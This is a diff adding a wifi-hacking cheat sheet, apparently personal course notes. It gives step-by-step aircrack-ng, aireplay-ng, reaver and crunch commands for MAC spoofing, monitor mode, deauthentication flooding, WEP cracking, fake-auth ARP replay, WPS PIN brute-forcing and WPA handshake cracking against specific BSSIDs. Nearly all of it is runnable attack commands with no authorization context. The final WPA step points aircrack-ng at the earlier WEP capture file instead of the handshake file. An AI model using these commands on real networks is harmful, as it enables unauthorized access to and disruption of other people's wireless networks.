@@ -1,0 +1,67 @@
+Hacking wifi:
+Changing Network MAC:
+ifconfig
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+
+Monitor mode setup:
+iwconfig
+ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+Find out available wireless networks:
+airodump-ng wlan0
+airodump-ng --band a  wlan0    [5GHz network]
+
+ESSID --> Network name
+Beacons --> frames sent by the network
+BSSID --> Mac address
+DATA --> Data frames captured by the last 10 sec
+CHANNEL--> Channel on which the network works
+ENC --> Encryption
+CIPHER --> Algorithm used by the network
+
+Deauth attack:
+airodump-ng wlan0
+airodump-ng --bssid AE:C6:DA:85:78:8E --channel 11 --write test-1  wlan0
+aireplay-ng --deauth 10000000000 -a AE:C6:DA:85:78:8E -c 7E:ED:A6:63:7D:AE wlan0
+
+WEP cracking[normal]:
+airodump-ng wlan0
+airodump-ng --bssid AE:C6:DA:85:78:8E --channel 11 --write basic_wep wlan0
+aircrack-ng basic_wep-01.cap
+
+Fakeauth attack[advanced]:
+1st terminal:
+airodump-ng wlan0
+airodump-ng --bssid AE:C6:DA:85:78:8E --channel 11 --write arpreplay wlan0
+
+2nd terminal:
+aireplay-ng --fakeauth 0 -a AE:C6:DA:85:78:8E -h 32:B6:E8:1A:C4:FD wlan0
+
+3rd terminal:
+aireplay-ng --arpreplay -b AE:C6:DA:85:78:8E -h 32:B6:E8:1A:C4:FD wlan0
+
+WPA/WPA2 cracking[wps exploitation]:
+1st terminal:
+wash --interface wlan0    [to check wps is enabled or not. If the LCK is no then we can attack]
+aireplay-ng --fakeauth 30 -a AE:C6:DA:85:78:8E -h 32:B6:E8:1A:C4:FD wlan0    [associate after every 30 sec] [hold] after 2nd terminal [run]
+-h is the mac of network interface. Ifconfig then take the first 12 digits and replace - with :
+
+2nd terminal:
+reaver --bssid AE:C6:DA:85:78:8E --channel 11 --interface wlan0 -vvv --no-associate    [run]
+
+WPA/WPA2 cracking[with wordlist]:
+1st terminal:
+airodump-ng wlan0
+airodump-ng --bssid AE:C6:DA:85:78:8E --channel 11 --write handshake wlan0
+
+2nd terminal:
+aireplay-ng --deauth 4 -a AE:C6:DA:85:78:8E -c 24:EE:9A:A4:2E:91 wlan0
+
+3rd terminal:
+crunch 6 6 123abc$ -t a@@@@b -o wordlist
+aircrack-ng basic_wep-01.cap -w wordlist
